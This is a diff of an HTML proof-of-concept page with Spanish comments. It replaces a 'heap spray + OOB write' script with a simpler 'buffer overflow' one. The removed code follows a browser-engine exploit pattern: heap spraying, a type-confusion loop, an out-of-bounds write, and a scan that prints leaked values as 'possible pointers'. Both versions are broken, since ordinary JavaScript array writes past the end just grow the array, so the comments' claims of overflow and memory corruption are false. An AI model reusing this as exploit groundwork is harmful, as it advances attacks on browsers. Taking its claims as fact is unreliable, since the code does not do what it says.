@@ -1,69 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head><title>PoC Avanzado: Heap Spray + OOB Write</title></head>
+<head><title>PoC: Buffer Overflow</title></head>
 <body>
-  <h1>PoC Avanzado: Heap Spray + OOB Write</h1>
+  <h1>PoC: Buffer Overflow</h1>
   <pre id="log"></pre>
   <script>
     const log = (msg) => document.getElementById("log").textContent += msg + "\n";
 
-    let float_arr;
-    let oob;
-    let objs = [];
+    let buffer = [];
+    let targetBuffer = [];
 
-    // Función para representar valores de memoria en formato hexadecimal
-    function hex(f) {
-      let buf = new ArrayBuffer(8);
-      let f64 = new Float64Array(buf);
-      let u64 = new BigUint64Array(buf);
-      f64[0] = f;
-      return "0x" + u64[0].toString(16);
-    }
-
-    // Función para realizar el spray de heap con un número elevado de objetos
-    function heapSpray() {
-      for (let i = 0; i < 50000; i++) {
-        // Mezclamos objetos y arrays complejos en el heap
-        objs.push({a: 13.37, b: Math.random(), c: `obj${i}`, d: [1, 2, 3, 4, 5]});
+    // Functión para llenar el buffer con datos y causarle un desbordamiento
+    function fillBuffer() {
+      for (let i = 0; i < 10000; i++) {
+        buffer.push(i); // Llenamos con valores que nos ayudarán a sobrepasar límites
       }
     }
 
-    // Configura el array y realiza la confusión de tipos
-    function setup() {
-      float_arr = [1.1, 2.2, 3.3];
-      heapSpray(); // Llenamos el heap con objetos complejos
-
-      // Realizamos la confusión de tipo con un array
-      function confuse(arr, index, val) {
-        for (let i = 0; i < 50000; i++) {
-          arr[0] = 1.1;
-        }
-        arr[index] = val;
-        return arr;
-      }
-
-      // Corrupta el array y le asigna un valor fuera de límites
-      oob = confuse(float_arr, 200, 13.37);
-    }
-
-    // Función para escanear el array corrompido en busca de punteros
-    function scan() {
-      log("=== Escaneo OOB ===");
-      for (let i = 0; i < 500; i++) {
-        try {
-          let v = oob[i];
-          if (typeof v === "number" && v !== 1.1 && v !== 2.2 && v !== 3.3 && v !== 13.37) {
-            log(`oob[${i}] = ${v} → posible ptr: ${hex(v)}`);
-          }
-        } catch (e) {
-          log(`oob[${i}] = [EXC]`);
-        }
+    // Función para intentar escribir fuera de los límites del buffer
+    function overflow() {
+      for (let i = 0; i < 100; i++) {
+        targetBuffer[i] = 13.37; // Intentamos escribir fuera de los límites
       }
     }
 
     // Llamamos a las funciones
-    setup();
-    scan();
+    fillBuffer();
+    overflow();
+
+    // Escaneo de memoria para detectar cambios
+    log("=== Escaneo de Buffer ===");
+    for (let i = 0; i < targetBuffer.length; i++) {
+      log(`targetBuffer[${i}] = ${targetBuffer[i]}`);
+    }
   </script>
 </body>
 </html>
